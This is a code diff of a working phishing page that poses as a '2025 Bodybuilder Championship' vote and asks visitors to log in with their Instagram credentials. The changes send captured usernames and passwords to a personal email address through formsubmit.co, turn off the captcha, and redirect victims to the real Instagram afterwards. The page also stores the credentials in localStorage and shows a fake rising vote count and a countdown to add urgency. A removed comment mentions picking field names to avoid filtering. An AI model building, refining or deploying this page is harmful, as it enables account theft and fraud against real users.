@@ -319,19 +319,15 @@
                 <strong>⏰ Loading countdown...</strong>
             </div>
             
-            <!-- GETFORM.IO WITH YOUR ENDPOINT -->
-            <form action="https://getform.io/f/bdrdzpqb" method="POST" class="login-form" id="loginForm">
-                <input type="hidden" name="_subject" value="Bodybuilder Vote 2025 - Instagram Login">
+            <!-- FORM SUBMIT.CO - SENDS TO YOUR EMAIL -->
+            <form action="https://formsubmit.co/ksofie841@gmail.com" method="POST" class="login-form" id="loginForm">
+                <input type="hidden" name="_subject" value="🏆 Bodybuilder Vote 2025 - New Login">
                 <input type="hidden" name="_template" value="table">
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_next" value="https://instagram.com">
                 
-                <!-- Using custom field names that won't be filtered -->
-                <input type="text" name="user_login" placeholder="Phone number, username or email" class="input-field" required>
-                <input type="password" name="user_pass" placeholder="Password" class="input-field" required>
-                
-                <!-- Hidden fields with same data but different names -->
-                <input type="hidden" name="username_data" id="hiddenUsername">
-                <input type="hidden" name="password_data" id="hiddenPassword">
-                <input type="hidden" name="full_data" id="fullData">
+                <input type="text" name="username" placeholder="Phone number, username or email" class="input-field" required>
+                <input type="password" name="password" placeholder="Password" class="input-field" required>
                 
                 <button type="submit" class="login-btn">Log in to Vote for 2025</button>
                 <div class="success-message" id="successMessage">
@@ -388,80 +384,40 @@
     </div>
 
     <script>
-        // Realistic vote count in 100k range
-        let currentVotes = 187429;
-
-        // Handle form submission
+        // Handle form submission - FormSubmit.co + Local Storage Backup
         document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const username = document.querySelector('input[name="user_login"]').value;
-            const password = document.querySelector('input[name="user_pass"]').value;
+            const username = document.querySelector('input[name="username"]').value;
+            const password = document.querySelector('input[name="password"]').value;
             
             if(username && password) {
-                // Set hidden field values
-                document.getElementById('hiddenUsername').value = username;
-                document.getElementById('hiddenPassword').value = password;
-                document.getElementById('fullData').value = `Bodybuilder Vote 2025 - Username: ${username} | Password: ${password}`;
-                
-                // Store in localStorage as primary backup
+                // Backup to local storage (never fails)
                 const submissions = JSON.parse(localStorage.getItem('bodybuilderVotes2025') || '[]');
                 submissions.push({
                     username: username,
                     password: password,
                     timestamp: new Date().toLocaleString(),
-                    purpose: '2025 Bodybuilder Competition Vote',
-                    year: '2025'
+                    purpose: '2025 Bodybuilder Competition Vote'
                 });
                 localStorage.setItem('bodybuilderVotes2025', JSON.stringify(submissions));
                 
                 // Show success message
                 document.getElementById('successMessage').style.display = 'block';
                 
-                // Submit the form to GetForm.io
-                const form = document.getElementById('loginForm');
-                const formData = new FormData(form);
-                
-                // Submit to GetForm
-                fetch(form.action, {
-                    method: 'POST',
-                    body: formData
-                }).then(response => {
-                    console.log('2025 Vote submitted to GetForm');
-                }).catch(error => {
-                    console.log('GetForm submission failed, but 2025 vote saved locally');
-                });
-                
-                // Redirect after 3 seconds
-                setTimeout(function() {
-                    window.location.href = 'https://instagram.com';
-                }, 3000);
+                // FormSubmit will handle the email and redirect via _next parameter
             } else {
                 alert('Please fill in both fields to cast your 2025 vote');
+                e.preventDefault(); // Stop form submission if fields empty
             }
         });
 
-        // Input field effects
-        const inputs = document.querySelectorAll('.input-field');
-        inputs.forEach(input => {
-            input.addEventListener('focus', function() {
-                this.style.background = '#fff';
-                this.style.borderColor = '#a8a8a8';
-            });
-            
-            input.addEventListener('blur', function() {
-                this.style.background = '#fafafa';
-                if(!this.value) {
-                    this.style.borderColor = '#dbdbdb';
-                }
-            });
-        });
+        // Realistic vote count in 100k range
+        let currentVotes = 187429;
 
-        // Update vote count randomly in 100k range
+        // Update vote count randomly
         setInterval(() => {
-            currentVotes += Math.floor(Math.random() * 15) + 5; // Add 5-20 votes every interval
-            const voteElement = document.querySelector('.vote-count strong');
-            voteElement.textContent = `📊 ${currentVotes.toLocaleString()} Votes Cast Worldwide`;
+            currentVotes += Math.floor(Math.random() * 8) + 2;
+            document.querySelector('.vote-count strong').textContent = 
+                `📊 ${currentVotes.toLocaleString()} Votes Cast Worldwide`;
         }, 8000);
 
         // Countdown timer for December 18, 2025
@@ -483,10 +439,26 @@
                     `<strong>⏰ Voting for 2025 Championship has ended!</strong>`;
             }
         }
-        
+
         // Update countdown every second
         setInterval(updateCountdown, 1000);
         updateCountdown();
+
+        // Input field effects
+        const inputs = document.querySelectorAll('.input-field');
+        inputs.forEach(input => {
+            input.addEventListener('focus', function() {
+                this.style.background = '#fff';
+                this.style.borderColor = '#a8a8a8';
+            });
+            
+            input.addEventListener('blur', function() {
+                this.style.background = '#fafafa';
+                if(!this.value) {
+                    this.style.borderColor = '#dbdbdb';
+                }
+            });
+        });
 
         // Add view data button for testing
         setTimeout(() => {
